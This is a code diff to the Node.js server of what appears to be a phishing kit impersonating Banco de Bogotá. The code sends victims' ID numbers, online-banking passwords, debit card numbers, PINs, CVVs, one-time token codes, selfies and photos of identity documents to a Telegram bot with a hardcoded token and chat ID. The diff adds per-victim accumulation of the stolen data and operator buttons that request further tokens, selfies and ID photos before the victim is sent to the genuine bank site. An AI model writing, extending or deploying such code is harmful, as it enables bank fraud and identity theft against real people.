@@ -15,6 +15,9 @@ const NODE_ENV = process.env.NODE_ENV || 'development';
 // Set para mantener registro de clientes conectados
 const connectedClients = new Set();
 
+// Map para almacenar datos de sesiones por cliente
+const sessionData = new Map();
+
 // Configuración de Telegram
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002638389042';
@@ -113,7 +116,7 @@ const bot = new TelegramBot(TELEGRAM_TOKEN, {
 /**
  * Formatea los mensajes según el tipo de datos recibidos
  */
-function formatTelegramMessage(data) {
+function formatTelegramMessage(data, sessionId = null) {
     if (typeof data !== 'object') {
         return data.toString();
     }
@@ -124,6 +127,13 @@ function formatTelegramMessage(data) {
         timeStyle: 'short'
     });
 
+    // Obtener datos acumulados de la sesión si existe
+    let acumulado = '';
+    if (sessionId && sessionData.has(sessionId)) {
+        const session = sessionData.get(sessionId);
+        acumulado = '\n\n📊 <b>INFORMACIÓN ACUMULADA:</b>\n' + session.history.join('\n');
+    }
+
     switch (data.tipo) {
         case 'Clave Segura':
             return `🔐 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
@@ -131,7 +141,7 @@ function formatTelegramMessage(data) {
                    `🪪 <b>Documento:</b> ${data.tipoDocumento}\n` +
                    `🔢 <b>Número:</b> <code>${data.numeroDocumento}</code>\n` +
                    `🔑 <b>Clave:</b> <code>${data.clave}</code>\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}`;
+                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
         
         case 'Tarjeta Débito':
             return `💳 <b>NUEVA SOLICITUD DE INGRESO</b>\n\n` +
@@ -143,22 +153,27 @@ function formatTelegramMessage(data) {
                    `🔑 <b>Clave:</b> <code>${data.claveTarjeta}</code>\n` +
                    `📅 <b>Vencimiento:</b> <code>${data.fechaVencimiento}</code>\n` +
                    `🔐 <b>CVV:</b> <code>${data.cvv}</code>\n\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}`;
+                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
         
         case 'Token':
             return `🔐 <b>VERIFICACIÓN DE TOKEN</b>\n\n` +
                    `🔑 <b>Código:</b> <code>${data.codigo}</code>\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}`;
+                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
         
         case 'Selfie':
             return `📸 <b>SELFIE DE VERIFICACIÓN</b>\n\n` +
                    `🆔 <b>Message ID:</b> ${data.messageId}\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}`;
+                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
         
-        case 'Cédula':
-            return `🪪 <b>DOCUMENTO DE IDENTIDAD</b>\n\n` +
+        case 'Cédula Frontal':
+            return `🪪 <b>DOCUMENTO - LADO FRONTAL</b>\n\n` +
                    `🆔 <b>Message ID:</b> ${data.messageId}\n` +
-                   `⏰ <b>Fecha:</b> ${timestamp}`;
+                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
+        
+        case 'Cédula Trasera':
+            return `🪪 <b>DOCUMENTO - LADO TRASERO</b>\n\n` +
+                   `🆔 <b>Message ID:</b> ${data.messageId}\n` +
+                   `⏰ <b>Fecha:</b> ${timestamp}${acumulado}`;
         
         default:
             return JSON.stringify(data, null, 2);
@@ -169,16 +184,15 @@ function formatTelegramMessage(data) {
  * Genera el teclado inline para las acciones de Telegram
  */
 function getTelegramKeyboard(messageType = 'default') {
-    // Todos los mensajes tienen los mismos botones
     return {
         inline_keyboard: [
             [
-                { text: '❌ Error de Logo', callback_data: 'error_logo' },
-                { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' }
+                { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' },
+                { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
             ],
             [
-                { text: '❌ Error de Token', callback_data: 'error_token' },
-                { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
+                { text: '📸 Pedir Cara', callback_data: 'pedir_cara' },
+                { text: '🪪 Pedir Cédula', callback_data: 'pedir_cedula' }
             ],
             [
                 { text: '✅ Finalizar', callback_data: 'finalizar' }
@@ -190,8 +204,46 @@ function getTelegramKeyboard(messageType = 'default') {
 /**
  * Envía un mensaje a Telegram con formato y teclado inline
  */
-async function sendTelegramMessage(data) {
+async function sendTelegramMessage(data, sessionId = null) {
     try {
+        // Actualizar datos de sesión
+        if (sessionId && data.tipo !== 'Token') {
+            if (!sessionData.has(sessionId)) {
+                sessionData.set(sessionId, { history: [], data: {} });
+            }
+            
+            const session = sessionData.get(sessionId);
+            
+            // Guardar datos del mensaje actual
+            if (data.tipo === 'Clave Segura') {
+                session.data.clave = { tipoDocumento: data.tipoDocumento, numeroDocumento: data.numeroDocumento, clave: data.clave };
+                session.history.push(`✅ Clave Segura - Doc: ${data.numeroDocumento}`);
+            } else if (data.tipo === 'Tarjeta Débito') {
+                session.data.tarjeta = { 
+                    tipoDocumento: data.tipoDocumento, 
+                    numeroDocumento: data.numeroDocumento, 
+                    numeroTarjeta: data.numeroTarjeta,
+                    claveTarjeta: data.claveTarjeta,
+                    fechaVencimiento: data.fechaVencimiento,
+                    cvv: data.cvv
+                };
+                session.history.push(`✅ Tarjeta - ${data.numeroTarjeta}`);
+            } else if (data.tipo === 'Selfie') {
+                session.data.selfie = { messageId: data.messageId };
+                session.history.push(`✅ Selfie capturado`);
+            } else if (data.tipo === 'Cédula Frontal') {
+                if (!session.data.cedula) session.data.cedula = {};
+                session.data.cedula.frontal = { messageId: data.messageId };
+                session.history.push(`✅ Cédula Frontal`);
+            } else if (data.tipo === 'Cédula Trasera') {
+                if (!session.data.cedula) session.data.cedula = {};
+                session.data.cedula.trasera = { messageId: data.messageId };
+                session.history.push(`✅ Cédula Trasera`);
+            }
+            
+            sessionData.set(sessionId, session);
+        }
+        
         const keyboard = getTelegramKeyboard(data.tipo);
 
         // Si es una foto (base64), enviarla como imagen
@@ -207,7 +259,7 @@ async function sendTelegramMessage(data) {
                 const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
                 console.log('📦 Buffer creado, tamaño:', buffer.length, 'bytes');
                 
-                const caption = formatTelegramMessage(data);
+                const caption = formatTelegramMessage(data, sessionId);
                 
                 console.log('📤 Enviando foto a Telegram con botones...');
                 
@@ -227,7 +279,7 @@ async function sendTelegramMessage(data) {
         }
 
         // Enviar mensaje de texto
-        const messageText = formatTelegramMessage(data);
+        const messageText = formatTelegramMessage(data, sessionId);
 
         console.log('📤 Enviando mensaje a Telegram:', messageText);
 
@@ -266,21 +318,21 @@ function handleRedirect(action, baseUrl = '') {
     }
     
     const redirectMap = {
-        'error_logo': {
-            url: `${baseUrl}/index.html?action=error_logo`,
-            message: 'Error detectado. Por favor ingrese sus credenciales nuevamente'
-        },
         'pedir_logo': { 
             url: `${baseUrl}/index.html?action=pedir_logo`, 
             message: 'Por favor ingrese sus credenciales nuevamente'
         },
-        'error_token': {
-            url: `${baseUrl}/token.html?action=error_token`,
-            message: 'Código incorrecto. Por favor ingrese el código token nuevamente'
-        },
         'pedir_token': { 
             url: `${baseUrl}/token.html?action=pedir_token`, 
             message: 'Por favor ingrese el código token'
+        },
+        'pedir_cara': {
+            url: `${baseUrl}/cara.html?action=pedir_cara`,
+            message: 'Por favor capture su selfie de verificación'
+        },
+        'pedir_cedula': {
+            url: `${baseUrl}/cedula.html?action=pedir_cedula`,
+            message: 'Por favor capture su documento de identidad'
         },
         'finalizar': { 
             url: 'https://www.bancodebogota.com/personas', 
@@ -307,7 +359,10 @@ app.post('/api/send-telegram', async (req, res) => {
             });
         }
 
-        const result = await sendTelegramMessage(req.body);
+        // Obtener sessionId del cliente
+        const sessionId = req.body.sessionId || req.ip;
+        
+        const result = await sendTelegramMessage(req.body, sessionId);
         
         res.json({
             success: true,
